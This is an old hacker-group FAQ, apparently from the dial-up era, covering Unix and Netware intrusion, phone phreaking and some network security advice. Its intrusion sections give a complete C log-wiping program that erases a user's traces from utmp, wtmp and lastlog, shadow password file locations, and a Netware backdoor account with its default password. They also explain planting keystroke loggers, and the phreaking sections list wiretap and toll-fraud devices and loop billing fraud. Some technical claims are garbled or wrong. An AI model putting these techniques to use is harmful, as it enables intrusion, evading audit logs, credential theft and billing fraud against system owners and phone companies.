@@ -1,0 +1,955 @@
+Psychotic's FAQ
+by Virtual Circuit and Psychotic
+
+I. HACKING
+* What is hacking?
+* How do I crack shadowed passwords?
+* How can I tell the difference between an encrypted password and a shadowed password?
+* Where can I find the password file if it's shadowed?
+* Where is the password file located?
+* What is an exploit?
+* What are some basic telnet commands?
+* How do I get out of the log file?
+* What is a DNIC?
+* What is an NUA?
+* What is a VAX/VMS?
+* What is telnet?
+* What is an anonymous remailer?
+* What is PGP?
+* What is a tcp/ip?
+* What is a virus?
+* What is a trojan?
+* What is a worm?
+* What do I need to become a hacker?
+* What are some common accounts for Novell Netware?
+* How can I gain supervisor access to Novell Netware?
+* How do I access the passwords for Novell?
+* How do I crack a Novell Netware password?
+* What are the domain codes?
+II. PHREAKING
+* What is phreaking?
+* How do I start phreaking?
+* What are boxes?
+* What kind of boxes are there?
+* How do I make a box?
+* What is a loop?
+III.  Security
+* How do I set up an anonymous FTP server?
+* What are some ways that I can secure a network?
+* What is a "rainbow book?"
+* What is a sniffer?
+* What is a firewall?
+* How can I use PGP to benefit me?
+IV.  Group Questions
+* What is Psychotic?
+* Is Psychotic looking for new members?
+* What is Psychosis?
+* What is the "Devil's Gateway?"
+* Where can I find some good resources on hacking and phreaking?
+* Who are all the members in Psychotic?
+* What are Psychotic's offered services?
+
+Q. What is hacking?
+
+A. Hacking is the art of breaking into computers to gain knowledge that our society has hidden from us. Hacking is illegal and the government spend lots of money each year to have hackers arrested.....when they should be spending the money on more important issues.
+
+Q. What is a shadowed password?
+
+A. A shadowed password is a cover for the real password file. It shows that the real password is hidden somewhere else.
+
+Q. How do I crack shadowed passwords?
+
+A. Cracking a shadowed password file is impossible. Assuming that you got the password file via anonymous ftp. You should try connecting to port 25 and doing the sendmail bug.
+
+Q. What is the difference between an encrypted password and a shadowed password?
+
+A. An encrypted password is just the real password scrambled and changed. It can be cracked with a password cracked and a word file. A shadowed password hides the encrypted password somewhere else other than the etc. dir.
+
+Q.  Where can I find the password file if it's shadowed?
+
+A. Unix                  Path                            Token
+-----------------------------------------------------------------
+AIX 3                 /etc/security/passwd            !
+          or             /tcb/auth/files//
+A/UX 3.0s             /tcb/files/auth/?/*
+BSD4.3-Reno           /etc/master.passwd              *
+ConvexOS 10           /etc/shadpw                     *
+ConvexOS 11           /etc/shadow                     *
+DG/UX                 /etc/tcb/aa/user/               *
+EP/IX                 /etc/shadow                     x
+HP-UX                 /.secure/etc/passwd             *
+IRIX 5                /etc/shadow                     x
+Linux 1.1             /etc/shadow                     *
+OSF/1                 /etc/passwd[.dir|.pag]          *
+SCO Unix #.2.x        /tcb/auth/files//
+SunOS4.1+c2           /etc/security/passwd.adjunct    ##username
+SunOS 5.0             /etc/shadow
+                                  
+System V Release 4.0  /etc/shadow                     x
+System V Release 4.2  /etc/security/* database
+Ultrix 4              /etc/auth[.dir|.pag]            *
+UNICOS                /etc/udb                        *
+
+Q. Where is the password file located?
+
+A. The password file is located in the etc/passwd dir. You can get into the etc dir by logging on to the domain via anonymous ftp. 
+
+Q. What is an exploit?
+
+A. An exploit is something that exploits unix or another kind of OS. You usually use exploits to gain root or high access to a system. They can prove to be very handy.
+
+Q. What are some basic telnet commands?
+
+A. Below is a list of common telnet commands.
+
+Command                                                          Function
+
+access						Telnet account
+c						Connect to a host
+cont						Continue
+d						Disconnect
+full						Network echo
+half						Terminal echo
+hangup						Hangs up
+mail						Mail
+set						Select PAD parameters
+stat						Show network port.
+telemail						Mail
+
+Q.  How do I get out of the log file?
+
+A. Edit /etc/utmp, /usr/adm/wtmp and /usr/adm/lastlog. These are not text files that can be edited by hand with vi, you must use a program specifically written for this purpose.
+Example:
+
+#include 
+#include 
+#include 
+#include 
+#include 
+#include 
+#include 
+#include 
+#define WTMP_NAME "/usr/adm/wtmp"
+#define UTMP_NAME "/etc/utmp"
+#define LASTLOG_NAME "/usr/adm/lastlog"
+ 
+int f;
+ 
+void kill_utmp(who)
+char *who;
+{
+    struct utmp utmp_ent;
+ 
+  if ((f=open(UTMP_NAME,O_RDWR))>=0) {
+        while(read (f, &utmp_ent, sizeof (utmp_ent))> 0 )
+          if (!strncmp(utmp_ent.ut_name,who,strlen(who))) {
+                          bzero((char *)&utmp_ent,sizeof( utmp_ent ));
+                          lseek (f, -(sizeof (utmp_ent)), SEEK_CUR);
+                          write (f, &utmp_ent, sizeof (utmp_ent));
+                  }
+        close(f);
+  }
+}
+ 
+void kill_wtmp(who)
+char *who;
+{
+    struct utmp utmp_ent;
+    long pos;
+ 
+    pos = 1L;
+    if ((f=open(WTMP_NAME,O_RDWR))>=0) {
+ 
+        while(pos != -1L) {
+           lseek(f,-(long)( (sizeof(struct utmp)) * pos),L_XTND);
+           if (read (f, &utmp_ent, sizeof (struct utmp))<0) {
+                pos = -1L;
+           } else {
+                if (!strncmp(utmp_ent.ut_name,who,strlen(who))) {
+                        bzero((char *)&utmp_ent,sizeof(struct utmp ));
+                        lseek(f,-( (sizeof(struct utmp)) * pos),L_XTND);
+                        write (f, &utmp_ent, sizeof (utmp_ent));
+                        pos = -1L;
+                } else pos += 1L;
+           }
+        }
+        close(f);
+  }
+}
+ 
+void kill_lastlog(who)
+char *who;
+{
+    struct passwd *pwd;
+    struct lastlog newll;
+ 
+        if ((pwd=getpwnam(who))!=NULL) {
+ 
+           if ((f=open(LASTLOG_NAME, O_RDWR)) >= 0) {
+                  lseek(f, (long)pwd->pw_uid * sizeof (struct lastlog), 0);
+                  bzero((char *)&newll,sizeof( newll ));
+                  write(f, (char *)&newll, sizeof( newll ));
+                  close(f);
+           }
+ 
+    } else printf("%s: ?\n",who);
+}
+ 
+main(argc,argv)
+int argc;
+char *argv[];
+{
+    if (argc==2) {
+           kill_lastlog(argv[1]);
+           kill_wtmp(argv[1]);
+           kill_utmp(argv[1]);
+           printf("Zap2!\n");
+    } else
+    printf("Error.\n");
+}
+
+Q. What is DNIC?
+
+A. A DNIS says which network connect to the telnet you are using.
+
+Q. What is NUA?
+
+A.  The NUA is the address of the computer on telnet.
+
+Q.  What is a VAX/VMS?
+
+A.  A vax/vms is Digital Equipment's major computer line. It's proprietary operating system is known as vms.
+
+Q.  What is telnet?
+
+A. Telnet is a program which lets you log in to other computers on the net.
+
+Q.  What is an anonymous remailer?
+
+A. An anonymous remailer is a system on the Internet that allows you to send e-mail anonymously or post messages to Usenet anonymously. You apply for an anonymous ID at the remailer site. Then, when you send a message to the remailer, it sends it out from your anonymous ID at the remailer. No one reading the post will know your real account name or host name. If someone sends a message to your anonymous ID, it will be forwarded to your real account by the remailer.
+
+Q.  What is PGP?
+
+A. This FAQ answer is excerpted from:
+PGP(tm) User's Guide Volume I: Essential Topics by Philip Zimmermann
+PGP(tm) uses public-key encryption to protect E-mail and data files. Communicate securely with
+people you've never met, with no secure channels needed for prior exchange of keys. PGP is well
+featured and fast, with sophisticated key management, digital signatures, data compression, and
+good ergonomic design.
+Pretty Good(tm) Privacy (PGP), from Phil's Pretty Good Software, is a high security cryptographic software application for MS-DOS, Unix, VAX/VMS, and other computers. PGP allows people toexchange files or messages with privacy, authentication, and convenience. Privacy means that only those intended to receive a message can read it. Authentication means that messages that appear to be from a particular person can only have originated from that person. Convenience means that privacy and authentication are provided without the hassles of managing keys associated with conventional cryptographic software. No secure channels are needed to exchange keys between users, which makes PGP much easier to use. This is because PGP is based on a powerful new technology called "public key" cryptography. PGP combines the convenience of the Rivest-Shamir-Adleman (RSA) public key cryptosystem with the speed of conventional cryptography, message digests for digital signatures, data compression before encryption, good ergonomic design, and sophisticated key management. And PGP performs the public-key functions faster than most other software implementations. PGP is public key cryptography for the masses.
+
+Q.  What is tcp/ip?
+
+A. Tcp/ip is the system networks use to communicate with each other. It stands for Transmission Control Protocol/Internet Protocol.
+
+Q. What is a virus?
+
+A.  A Virus is a program which reproduces itself. It may attach itself to other programs, it may create copies of itself. It may damage or corrupt data, change data, or degrade the performance of your system by utilizing resources such as memory or disk space. Some Viruse scanners detect some Viruses. No Virus scanners detect all Viruses. Virus scanners will work for a while but people are always creating virii that will beat them.
+
+Q.  What is a trojan?
+
+A.  A trojan is a program which does an unauthorized function, hidden inside an authorized program. It does something other than it claims to do, usually something malicious, and it is intended by the author to do whatever it does. If it is not intentional, it is called a bug. 
+
+Q.  What is a worm?
+
+A.  Worms are programsthat copy themselves over and over using up space and slowing down the system. They are self contained and use the networks to spread, in much the same way that Viruses use files to spread. Some people say the solution to Viruses and worms is to just not have any files or networks. 
+
+
+Q.  What do I need to become a hacker?
+
+A.  You should start off with a good scanner, some dialups, a telnet client, and some knowladge of hacking. Those are the basic things that you will need. If you are serious about hacking then you should get Unix, or Linux(smaller, free version of unix).
+
+Q.  What are some common accounts for Novell Netware?
+
+A.   Below is a list of commonly used accounts for Novell Netware.
+       Account         Purpose
+        ----------      ------------------------------------------------------
+        PRINT           Attaching to a second server for printing
+        LASER           Attaching to a second server for printing
+        HPLASER         Attaching to a second server for printing
+        PRINTER         Attaching to a second server for printing
+        LASERWRITER     Attaching to a second server for printing
+        POST            Attaching to a second server for email
+        MAIL            Attaching to a second server for email
+        GATEWAY         Attaching a gateway machine to the server
+        GATE            Attaching a gateway machine to the server
+        ROUTER          Attaching an email router to the server
+        BACKUP          May have password/station restrictions (see below), used
+                        for backing up the server to a tape unit attached to a
+                        workstation. For complete backups, Supervisor equivalence
+                        is required.
+        WANGTEK         See BACKUP
+        FAX             Attaching a dedicated fax modem unit to the network
+        FAXUSER         Attaching a dedicated fax modem unit to the network
+        FAXWORKS        Attaching a dedicated fax modem unit to the network
+        TEST            A test user account for temp use
+        ARCHIVIST       Palidrome default account for backup
+        CHEY_ARCHSVR    An account for Arcserve to login to the server from    
+                        from the console for tape backup. Version 5.01g's
+                        password was WONDERLAND. Delete the Station
+                        Restrictions and use SUPER.EXE to toggle this 
+                        account and you have an excellent backdoor.
+        WINDOWS_PASSTHRU Although not required, per the Microsoft Win95
+                        Resource Kit, Ch. 9 pg. 292 and Ch. 11 pg. 401 you
+                        need this for resource sharing without a password.
+
+Q.  How can I gain supervisor access to Novell Netware?
+
+A. Taken from the Novell Netware FAQ.
+The secret method is the method of using a DOS-based sector editor to edit the 
+entry in the FAT, and reset the bindery to default upon server reboot. This gives 
+you Supervisor and Guest with no passwords. The method was taught in case you 
+lost Supervisor on a Netware 2.15 server and you had no supe equivalent accounts 
+created. It also saves the server from a wipe and reboot in case the Supervisor account is corrupt, deleted, or trashed.
+
+
+Q.  How do I access the password file for Novell?
+
+A. access to the password file in Netware is not like Unix - the password file isn't in the open. All objects and their properties are kept in the bindery files on 2.x and 3.x, and kept in the NDS
+database in 4.x. An example of an object might be a printer, a group, an individual's account etc. An example of an object's properties might include an account's password or full user name, or a group's member list or full name. The bindery files attributes (or flags) in 2.x and 3.x are Hidden
+and System, and these files are located on the SYS: volume in the SYSTEM subdirectory. Their names are as follows:
+
+        Netware version         File Names
+        ---------------         ----------
+        2.x                     NET$BIND.SYS, NET$BVAL.SYS
+        3.x                     NET$OBJ.SYS, NET$PROP.SYS, NET$VAL.SYS
+
+The NET$BVAL.SYS and NET$VAL.SYS are where the passwords are actually located
+in 2.x and 3.x respectively.
+
+
+Q.  How do I crack a Novell password?
+
+A.  Taken from the Novell Netware Hack FAQ.
+
+If Intruder Detection is off, you can use a "brute force" password cracker.
+
+Encrypted passwords is Novell's way of protecting passwords from sniffers.
+Since older versions of Netware (2.15c) sent passwords as plain text over the
+wire, a sniffer could see the password as it went by. To secure things,
+Novell gave the administrator a way to control this. Later versions of the
+LOGIN.EXE program would encrypt the password before transmitting it across
+the wire to the server. But before this could happen, the shell (NETX) had
+to be updated. Since some locations had to have older shells and older
+versions of LOGIN.EXE to support older equipment, the administrator has the
+option of allowing unencrypted passwords to access the server. This is done
+by typing SET ALLOW UNENCRYPTED PASSWORDS=ON at the console or by adding it
+to the AUTOEXEC.NCF. The default is OFF, which means NOVELBFH could be beeping
+the server console every attempt! Fortunately most sites turn this switch on to
+support some old device.
+
+If you have access to the console, either by standing in front of it or by
+RCONSOLE, you can use SETSPASS.NLM, SETSPWD.NLM or SETPWD.NLM to reset passwords.
+Just load the NLM and pass it command line parameters:
+
+        NLM             Account(s) reset        Netware version(s) supported
+        ------------    -----------------       ----------------------------
+        SETSPASS.NLM    SUPERVISOR              3.x
+        SETSPWD.NLM     SUPERVISOR              3.x, 4.x
+        SETPWD.NLM      any valid account       3.x, 4.x
+
+If you can plant a password catcher or keystroke reader, you can get them
+this way. The LOGIN.EXE file is located in the SYS:LOGIN directory, and
+normally you will not have access to put a file in that directory. The best
+place to put a keystroke capture program is in the workstation's path, with
+the ATTRIB set as hidden. The advantage is that you'll get the password and
+Netware won't know you swiped it. The disadvantage is getting access to the
+machine to do this. The very best place to put one of these capture programs
+is on a common machine, like a pcAnywhere box, which is used for remote access.
+Many locations will allow pcAnywhere access to a machine with virtually no 
+software on it, and control security access to the LAN by using Netware's 
+security features. Uploading a keystroke capture program to a machine like 
+this defeats this.
+
+Q.  What are the domain codes?
+
+A. Below is the current list of domain codes.
+AD   Andorra
+AE   United Arab Emirates
+AF   Afghanistan
+AG   Antigua and Barbuda
+AI   Anguilla
+AL   Albania
+AM   Armenia
+AN   Netherland Antilles
+AO   Angola
+AQ   Antarctica
+AR   Argentina
+AS   American Samoa
+AT   Austria
+AU   Australia
+AW   Aruba
+AZ   Azerbaidjan
+BA   Bosnia-Herzegovina
+BB   Barbados
+BD   Banglades
+BE   Belgium
+BF   Burkina Faso
+BG   Bulgaria
+BH   Bahrain
+BI   Burundi
+BJ   Benin
+BM   Bermuda
+BN   Brunei Darussalam
+BO   Bolivia
+BR   Brazil
+BS   Bahamas
+BT   Buthan
+BV   Bouvet Island
+BW   Botswana
+BY   Belarus
+BZ   Belize
+CA   Canada
+CC   Cocos (Keeling) Islands
+CF   Central African Republic
+CG   Congo
+CH   Switzerland
+CI   Ivory Coast
+CK   Cook Islands
+CL   Chile
+CM   Cameroon
+CN   China
+CO   Colombia
+CR   Costa Rica
+CS   Czechoslovakia
+CU   Cuba
+CV   Cape Verde
+CX   Christmas Island
+CY   Cyprus
+CZ   Czech Republic
+DE   Germany
+DJ   Djibouti
+DK   Denmark
+DM   Dominica
+DO   Dominican Republic
+DZ   Algeria
+EC   Ecuador
+EE   Estonia
+EG   Egypt
+EH   Western Sahara
+ES   Spain
+ET   Ethiopia
+FI   Finland
+FJ   Fiji
+FK   Falkland Islands (Malvinas)
+FM   Micronesia
+FO   Faroe Islands
+FR   France
+FX   France (European Territory)
+GA   Gabon
+GB   Great Britain (UK)
+GD   Grenada
+GE   Georgia
+GH   Ghana
+GI   Gibraltar
+GL   Greenland
+GP   Guadeloupe (French)
+GQ   Equatorial Guinea
+GF   Guyana (French)
+GM   Gambia
+GN   Guinea
+GR   Greece
+GT   Guatemala
+GU   Guam (US)
+GW   Guinea Bissau
+GY   Guyana
+HK   Hong Kong
+HM   Heard and McDonald Islands
+HN   Honduras
+HR   Croatia
+HT   Haiti
+HU   Hungary
+ID   Indonesia
+IE   Ireland
+IL   Israel
+IN   India
+IO   British Indian Ocean Territory
+IQ   Iraq
+IR   Iran
+IS   Iceland
+IT   Italy
+JM   Jamaica
+JO   Jordan
+JP   Japan
+KE   Kenya
+KG   Kirgistan
+KH   Cambodia
+KI   Kiribati
+KM   Comoros
+KN   Saint Kitts Nevis Anguilla
+KP   North Korea
+KR   South Korea
+KW   Kuwait
+KY   Cayman Islands
+KZ   Kazachstan
+LA   Laos
+LB   Lebanon
+LC   Saint Lucia
+LI   Liechtenstein
+LK   Sri Lanka
+LR   Liberia
+LS   Lesotho
+LT   Lithuania
+LU   Luxembourg
+LV   Latvia
+LY   Libya
+MA   Morocco
+MC   Monaco
+MD   Moldavia
+MG   Madagascar
+MH   Marshall Islands
+ML   Mali
+MM   Myanmar
+MN   Mongolia
+MO   Macau
+MP   Northern Mariana Islands
+MQ   Martinique (French)
+MR   Mauritania
+MS   Montserrat
+MT   Malta
+MU   Mauritius
+MV   Maldives
+MW   Malawi
+MX   Mexico
+MY   Malaysia
+MZ   Mozambique
+NA   Namibia
+NC   New Caledonia (French)
+NE   Niger
+NF   Norfolk Island
+NG   Nigeria
+NI   Nicaragua
+NL   Netherlands
+NO   Norway
+NP   Nepal
+NR   Nauru
+NT   Neutral Zone
+NU   Niue
+NZ   New Zealand
+OM   Oman
+PA   Panama
+PE   Peru
+PF   Polynesia (French)
+PG   Papua New
+PH   Philippines
+PK   Pakistan
+PL   Poland
+PM   Saint Pierre and Miquelon
+PN   Pitcairn
+PT   Portugal
+PR   Puerto Rico (US)
+PW   Palau
+PY   Paraguay
+QA   Qatar
+RE   Reunion (French)
+RO   Romania
+RU   Russian Federation
+RW   Rwanda
+SA   Saudi Arabia
+SB   Solomon Islands
+SC   Seychelles
+SD   Sudan
+SE   Sweden
+SG   Singapore
+SH   Saint Helena
+SI   Slovenia
+SJ   Svalbard and Jan Mayen Islands
+SK   Slovak Republic
+SL   Sierra Leone
+SM   San Marino
+SN   Senegal
+SO   Somalia
+SR   Suriname
+ST   Saint Tome and Principe
+SU   Soviet Union
+SV   El Salvador
+SY   Syria
+SZ   Swaziland
+TC   Turks and Caicos Islands
+TD   Chad
+TF   French Southern Territory
+TG   Togo
+TH   Thailand
+TJ   Tadjikistan
+TK   Tokelau
+TM   Turkmenistan
+TN   Tunisia
+TO   Tonga
+TP   East Timor
+TR   Turkey
+TT   Trinidad and Tobago
+TV   Tuvalu
+TW   Taiwan
+TZ   Tanzania
+UA   Ukraine
+UG   Uganda
+UK   United Kingdom
+UM   US Minor Outlying Islands
+US   United States
+UY   Uruguay
+UZ   Uzbekistan
+VA   Vatican City State
+VC   Saint Vincent and Grenadines
+VE   Venezuela
+VG   Virgin Islands (British)
+VI   Virgin Islands (US)
+VN   Vietnam
+VU   Vanuatu
+WF   Wallis and Futuna Islands
+WS   Samoa
+YE   Yemen
+YU   Yugoslavia
+ZA   South Africa
+ZM   Zambia
+ZR   Zaire
+ZW   Zimbabwe
+ARPA   Old style Arpanet
+COM   US Commercial
+EDU   US Educational
+GOV   US Government
+INT   International
+MIL   US Military
+NATO   Nato field
+NET   Network
+ORG   Non-Profit
+
+
+
+Q.  What is phreaking?
+
+A. Phreaking is anything illegal that has to do with phones and phone lines.
+
+Q.  How do I start phreaking?
+
+A. You should start by learning about boxes and reading up on different types of phreaking.
+
+Q. What kind of boxes are there?
+
+A.Below is a list of the most common boxes and what they do.
+
+Acrylic Box - Steal Three-Way-Calling and Call Waiting. 
+Aero Box - Make free fone calls from Payfones. 
+Aqua Box - Drain voltage from a FBI Lock In Trace call. 
+Beige Box - Replicates a line mens hand-set. 
+Black Box - Allows the calling party not to get charged for the call they place. 
+Blast Box - Fone Microphone Amplifier. 
+Blotto Box - Shorts every fone out in the area. 
+Blue Box - Utilizing 2600Hz tones for free fone calls. 
+Brown Box - Creates a party line from 2 existing fone lines. 
+Bud Box - Used to tap into your neighbors fone line. 
+Busy Box - Used to kill the dial tone on someone's fone. 
+Chartreuse Box - Use the electricty from your phone for other things. 
+Cheese Box - Turns your fone into a Payfone. 
+Chrome Box - Lets you manipulate traffic signals via remote control. 
+Clear Box - Used to make free calls on Fortress Fones. 
+Copper Box - Causes cross-talk interference on an extender. 
+Crimson Box - Acts as a 'Hold' button for your fone. 
+Dark Box - REroutes outgoing or incomming calls to another fone. 
+Dayglo Box - Allows you to connect to your neighbors fone line. 
+Ditto Box - Allows you to evesdrop on another fone line. 
+Divertor Box - REroutes outgoing or incomming calls to another fone. 
+DLOC Box - Lets you confrence 2 fone lines (other than your own). 
+Gold Box - Allows you to trace a call or tell if its being traced. 
+Green Box - Lets you make the Coin Collect, Coin Return, and Ringback tones. 
+Jack Box - A touch-tone keypad. 
+Light Box - An AM Transmitter. 
+Lunch Box - Used to tap into your neighbors fone line. 
+Magenta Box - Connects one remote fone line to another remote fone line. 
+Mauve Box - Lets you fone tap without cutting into the fone line. 
+Neon Box - An external microphone. 
+New Gold Box - A new updated version of the Gold Box. 
+Noise Box - Creates line noise. 
+Olive Box - Used as an external ringer. 
+Paisley Box - A combination of almost all the boxes there are. 
+Pandora Box - Creates a high intensity tone which can cause pain. Good for pranking. 
+Party Box - Lets you make a party line from 2 fone lines. 
+Pearl Box - A tone generator. 
+Pink Box - Lets you hook 2 seprate fone lines together and have 3 way calling. 
+Purple Box - A fone hold button. 
+Rainbow Box - Kills a trace by putting 120v into the fone line. 
+BoRed x - Lets you make free calls from a payfone by producing the coins tones. 
+Rock Box - Adds music to your fone line. 
+Scarlet Box - Silver Box - Adds DTMF A, B, C, & D priority tones to your line. 
+Slush Box - Can be installed at places of business that have standard multi-line fones. 
+Static Box - Keep voltage on a fone line high. 
+Switch Box - Adds hold, indicator lights, confrence, etc. 
+Tan Box - Line activated telefone recorder. 
+Tron Box - Reverse the phase of power to your house, and make your meter run slower. 
+Urine Box - Makes a disturbance between the ring and tip wires in someones fone. 
+Violet Box - Keeps a payfone from hanging up. 
+White Box - A portable DTMF keypad. 
+Yellow Box - Add an extention fone.
+
+Q.  How do I make a box?
+
+A.  Each box has a sepperate plan to set it up. Just do a netsearch for phreaking or boxes and you can find all the plans you need.
+
+Q.  What is a loop?
+
+A. This FAQ answer is excerpted from:
+ToneLoc v0.99 User Manual by Minor Threat & Mucho Maas
+Loops are a pair of phone numbers, usually consecutive, like 836-9998 and 836-9999. They are
+used by the phone company for testing. What good do loops do us? Well, they are cool in a few
+ways. Here is a simple use of loops. Each loop has two ends, a 'high' end, and a 'low' end. One end
+gives a (usually) constant, loud tone when it is called. The other end is silent. Loops don't usually
+ring either. When BOTH ends are called, the people that called each end can talk through the loop.
+Some loops are voice filtered and won't pass anything but a constant tone; these aren't much use to
+you. Here's what you can use working loops for: billing phone calls! First, call the end that gives the loud tone. Then if the operator or someone calls the other end, the tone will go quiet. Act like the phone just rang and you answered it ... say "Hello", "Allo", "Chow", "Yo", or what the fuck ever. The operator thinks that she just called you, and that's it! Now the phone bill will go to the loop, and your local RBOC will get the bill! Use this technique in moderation, or the loop may go down. Loops are probably most useful when you want to talk to someone to whom you don't want to give your phone number.
+
+Q.  How do I set up an anonymous FTP?
+
+A. Taken from the Internet Security Systems, Inc. text on setting up an anonymous ftp.
+- 1.Build a statically linked version of ftpd and put it in ~ftp/bin. Make sure it's owned by root. 
+     - 2.Build a statically linked version of /bin/ls if you'll need one. Put it in ~ftp/bin. If you are on a Sun, and need to build one, there's a ported version of the BSD net2 ls command for SunOs
+     on ftp.tis.com: pub/firewalls/toolkit/patches/ls.tar.Z Make sure it's owned by root. 
+     - 3.Chown ~ftp to root and make it mode 755 THIS IS VERY IMPORTANT 
+    -  4.Set up copies of ~ftp/etc/passwd and ~ftp/etc/group just as you would normally, EXCEPT
+     make 'ftp's home directory '/' -- make sure they are owned by root. 
+    -  5.Write a wrapper to kick ftpd off and install it in /etc/inetd.conf The wrapper should look
+     something like: (assuming ~ftp = /var/ftp) 
+     main()
+
+     {
+
+     if(chdir("/var/ftp")) {
+
+             perror("chdir /var/ftp");
+
+             exit(1);
+
+     }
+
+     if(chroot("/var/ftp")) {
+
+             perror("chroot /var/ftp");
+
+             exit(1);
+
+     }
+
+     /* optional: seteuid(FTPUID); */
+
+     execl("/bin/ftpd","ftpd","-l",(char *)0);
+
+     perror("exec /bin/ftpd");
+
+     exit(1);
+
+     }
+     Options: 
+     You can use 'netacl' from the toolkit or tcp_wrappers to achieve the same effect. 
+     We use 'netacl' to switch so that a few machines that connect to the FTP service *don't* get
+     chrooted first. This makes transferring files a bit less painful. 
+     You may also wish to take your ftpd sources and find all the places where it calls seteuid()
+     and remove them, then have the wrapper do a setuid(ftp) right before the exec. This means
+     that if someone knows a hole that makes them "root" they still won't be. Relax and imagine
+     how frustrated they will be. 
+     If you're hacking ftpd sources, I suggest you turn off a bunch of the options in ftpcmd.y by
+     unsetting the "implemented" flag in ftpcmd.y. This is only practical if your FTP area is
+     read-only. 
+-   6.As usual, make a pass through the FTP area and make sure that the files are in correct modes
+     and that there's nothing else in there that can be executed. 
+-   7.Note, now, that your FTP area's /etc/passwd is totally separated from your real /etc/passwd.
+     This has advantages and disadvantages. 
+-    8.Some stuff may break, like syslog, since there is no /dev/log. Either build a version of ftpd
+     with a UDP-based syslog() routine or run a second syslogd based on the BSD Net2 code,
+     that maintains a unix-domain socket named ~ftp/dev/log with the -p flag.
+
+Q.  What are some ways I can secure a network?
+
+A.  Taken from the Internet Security Systems text on securing a network.
+1. Well first of all you should know what type of resources that you're trying to protect: CPU, files, storage devices phone lines, etc... 
+ 2. Determine the host-specific security measures needed. Password protection, file
+encryption, firewall, etc...
+     Determine who the computer systems must be defended. 
+     Determine the likelihood of a threat. 
+     Implement measures to protect network resource. 
+
+3. Consider the corporate budget when planning for Internet Security.
+
+4. Design a Security Policy that describes your organization's network security
+concerns. This policy should take into account the following:
+
+     Network Security Planning 
+     Site Security Policy 
+     Risk Analysis 
+     Risk analysis involves determining the following:
+          What you need to protect 
+          What you need to protect it from 
+          How to protect it 
+          Estimating the risk of losing the resource 
+          Estimating the importance of the resource 
+
+5. Consider the following factors to determine who will grant access to services on your
+networks:
+     Will access to services be granted from a central point? 
+     What methods will you use to create accounts and terminate access? 
+
+6. Design and Implement Packet Filter Rules
+
+7. Ensure your Firewall has the following properties:
+     All traffic from inside to outside, as well as outside to inside must pass through the
+     firewall. 
+     Allow only authorized traffic as defined by your corporate security policy be
+     passed through the firewall. 
+     Ensure the firewall is immune to penetration. 
+
+8. Educate users about password protection:
+     Educating users not to use passwords that are easy to guess. 
+     Ensuring the password lengths are adequate. 
+     Running a password guesser. 
+     Requiring the use of a password generator. 
+     Always using a mixture of upper- and lowercase characters. 
+     Always using at least one or two non-alphanumeric characters. 
+     Never using dictionary words or ones spelled backwards. 
+     Never using a portion or variation of a proper name, address or anything that
+     could obviously identify you (the user). 
+
+9. Security-related organizations play an integral role in the development and
+deployment of Internet technologies. Keep abreast of the latest in security-related
+activities by visiting their Web sites. Here are some key security-rated organizations
+which aid corporations such as yours in keeping the Internet a safer place to compute:
+     ACM/SIGSAC at gopher://gopher.acm.org/.
+     CERT (a 24-hour Computer Emergency Response Team) at:
+     ftp://info.cert.org/pub/cert_faq and
+     http://www.sei.cmu.edu/SEI/programs/cert.html.
+     CIAC (U.S. Department of Energy's Computer Incident Advisory
+     Capability) at: http://ciac.llnl.gov/
+     CPSR (Computer Professionals for Social Responsibility) at:
+     http://cpsr.org.home
+     EFF (Electronic Frontier Foundation) at: http://www.eff.org/
+     EPIC (Electronic Privacy Information Center) at: http:/epic.org/
+     FIRST (Forum of Incident Reponse and Security Teams) at:
+     http://first.org/first/
+     Internet Society at http://www.isoc.org/
+
+Q.  What is a "rainbow book?"
+
+A.  Rainbow Books are books on security. The current book listing is listed below.
+
+Orange Book- Department of Defense Trusted Computer System Evaluation Criteria.
+Green Book- Department of Defense Password Management Guideline.
+Yellow Book- Guidance for Applying the Department of Defense Trusted Computer System Evaluation Criteria in Specific Environments.
+Tan Book- A Guide to Understanding Audit in Trusted Systems.
+Bright Blue Book- A Guide for Vendors.
+Neon Orange Book- A Guide to Understanding Discretionary Access Control in Trusted Systems.
+Teal Green Book-  Glossary of Computer Security Terms.
+Red Book- Trusted Network Interpretation of the Trusted Computer System Evaluation Criteria.
+Burgandy Book- A Guide to Understanding Design Documentation in Trusted Systems.
+Dark Lavender Book- A Guide to Understanding Trusted Distribution in Trusted Systems.
+Venice Blue Book- Computer Security Subsystem Interpretation of the Trusted Computer System Evaluation Criteria.
+Aqua Book- Department of Defense Trusted Computer System Evaluation Criteria A Guide to Understanding Security Modeling in Trusted Systems.
+Dark Red Book- Guidance for Applying the Trusted Network Interpretation.
+Pink Book- Department of Defense Trusted Computer System Evaluation Criteria Rating Maintenance Phase.
+Purple Book- Department of Defense Trusted Computer System Evaluation Criteria Guidelines for Formal Verification Systems.
+Brown Book- Department of Defense Trusted Computer System Evaluation Criteria A Guide to Understanding Trusted Facility Management.
+Yellow-Green Book- Department of Defense Trusted Computer System Evaluation Criteria Guidelines for Writing Trusted Facility Manuals.
+Light Blue Book- Department of Defense Trusted Computer System Evaluation Criteria A Guide to Understanding Identification and Authentication in Trusted Systems.
+Blue Book- Department of Defense Trusted Computer System Evaluation Criteria Trusted Product Evaluation Questionnaire.
+Grey Book-Department of Defense Trusted Computer System Evaluation Criteria Trusted Unix Working Group (TRUSIX) Rationale for Selecting Access Control List Features for the Unix System.
+Lavender Book- Department of Defense Trusted Computer System Evaluation Criteria Trusted Data Base Management System Interpretation of the Trusted Computer System Evaluation Criteria.
+Bright Orange Book- Department of Defense Trusted Computer System Evaluation Criteria A Guide to Understandng Security Testing and Test Documentation in Trusted Systems.
+Hot Peach Book- Department of Defense Trusted Computer System Evaluation Criteria A Guide to Writing the Security Features User's Guide for Trusted Systems.
+Turquoise Book- Department of Defense Trusted Computer System Evaluation Criteria A Guide to Understanding Information System Security Officer Responsibilities for Automated Information Systems.
+Violet Book- Department of Defense Trusted Computer System Evaluation Criteria Assessing Controlled Access Protection.
+Light Pink Book- Department of Defense Trusted Computer System Evaluation Criteria A Guide to Understanding Covert Channel Analysis of Trusted Systems.
+C1 Technical Report-001- Department of Defense Trusted Computer System Evaluation Criteria Computer Viruses: Prevention, Detection, and Treatment.
+C Technical Report 79-91- Department of Defense Trusted Computer System Evaluation Criteria Integrity in Automated Information Systems.
+C Technical Report 39-92-  Department of Defense Trusted Computer System Evaluation Criteria The Design and Evaluation of INFOSEC systems: The Computer Security Contributions to the Composition Discussion.
+NTISSAM COMPUSEC/1-87- Department of Defense Trusted Computer System Evaluation Criteria Advisory Memorandum on Office Automation Security Guideline.
+
+
+
+Q.  What is a firewall?
+
